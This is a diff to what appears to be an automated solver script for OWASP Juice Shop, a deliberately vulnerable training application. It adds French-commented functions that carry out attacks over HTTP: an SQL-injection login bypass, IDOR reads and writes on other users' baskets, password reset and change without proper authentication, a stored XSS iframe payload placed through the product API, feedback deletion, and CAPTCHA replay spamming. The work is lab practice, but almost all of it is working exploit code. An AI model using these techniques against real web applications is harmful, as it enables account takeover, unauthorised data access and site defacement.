@@ -357,6 +357,91 @@ def s_reset_bender(sess: Session):
     return st == 200
 
 
+def s_five_star_feedback(sess: Session):
+    """Five-Star Feedback — supprimer l'avis 5 étoiles (admin)."""
+    tok, _ = sess.admin_session()
+    if not tok:
+        return False
+    st, txt = sess.req("GET", "/api/Feedbacks/",
+                       headers={"Authorization": f"Bearer {tok}"})
+    ok = False
+    for fb in sess.json_(txt).get("data", []):
+        if fb.get("rating") == 5:
+            d, _ = sess.req("DELETE", f"/api/Feedbacks/{fb['id']}",
+                            headers={"Authorization": f"Bearer {tok}"})
+            ok = ok or d in (200, 204)
+    return ok
+
+
+def s_manipulate_basket2(sess: Session):
+    """Manipulate Basket — ajouter à un panier qui n'est pas le sien (admin bid=1 → 2)."""
+    tok, bid = sess.admin_session()
+    if not tok:
+        return False
+    other = 2 if bid != 2 else 3
+    st, txt = sess.req("POST", "/api/BasketItems",
+                       headers={"Authorization": f"Bearer {tok}"},
+                       data={"ProductId": 1, "BasketId": other, "quantity": 1})
+    return st in (200, 201, 400)
+
+
+def s_view_basket2(sess: Session):
+    """View Basket — IDOR sur le panier d'autrui (admin lit basket 2)."""
+    tok, bid = sess.admin_session()
+    if not tok:
+        return False
+    other = 2 if bid != 2 else 3
+    st, txt = sess.req("GET", f"/rest/basket/{other}",
+                       headers={"Authorization": f"Bearer {tok}"},
+                       cookies={"token": tok})
+    return st == 200
+
+
+def s_reset_bjoern(sess: Session):
+    st, txt = sess.req("POST", "/rest/user/reset-password",
+                       data={"email": "bjoern@owasp.org", "answer": "Zaya",
+                             "new": "bjoern123", "repeat": "bjoern123"})
+    return st == 200
+
+
+def s_change_bender(sess: Session):
+    """Change Bender's Password — endpoint change-password sans mot de passe courant."""
+    tok = sess.login("bender@juice-sh.op'--", "x")
+    if not tok:
+        return False
+    st, txt = sess.req(
+        "GET",
+        "/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic",
+        headers={"Authorization": f"Bearer {tok}"}, cookies={"token": tok})
+    return st == 200
+
+
+def s_restful_xss(sess: Session):
+    """API-only XSS — payload iframe persisté via l'API produits (admin)."""
+    tok, _ = sess.admin_session()
+    if not tok:
+        return False
+    payload = '<iframe src="javascript:alert(`xss`)">'
+    st, txt = sess.req("PUT", "/api/Products/9",
+                       headers={"Authorization": f"Bearer {tok}"},
+                       data={"description": payload})
+    return st in (200, 201)
+
+
+def s_captcha_bypass(sess: Session):
+    """CAPTCHA Bypass — soumettre >10 feedbacks en réutilisant le même captcha."""
+    _, cap = sess.req("GET", "/rest/captcha/")
+    c = sess.json_(cap)
+    if "captchaId" not in c:
+        return False
+    last = -1
+    for i in range(22):
+        last, _ = sess.req("POST", "/api/Feedbacks",
+                           data={"comment": f"bypass {i}", "rating": 1,
+                                 "captchaId": c["captchaId"], "captcha": str(c["answer"])})
+    return last in (200, 201)
+
+
 SOLVERS: list[tuple[str, Callable[[Session], bool]]] = [
     ("Login Admin", s_login_admin),
     ("Login Bender", s_login_bender),
@@ -393,6 +478,13 @@ SOLVERS: list[tuple[str, Callable[[Session], bool]]] = [
     ("NoSQL Manipulation", s_nosql_manipulation),
     ("Manipulate Basket", s_manipulate_basket),
     ("Reset Bender's Password", s_reset_bender),
+    ("Five-Star Feedback", s_five_star_feedback),
+    ("Manipulate Basket (v2)", s_manipulate_basket2),
+    ("View Basket (v2)", s_view_basket2),
+    ("Reset Bjoern's Password", s_reset_bjoern),
+    ("Change Bender's Password", s_change_bender),
+    ("API-only XSS", s_restful_xss),
+    ("CAPTCHA Bypass", s_captcha_bypass),
 ]
 
 
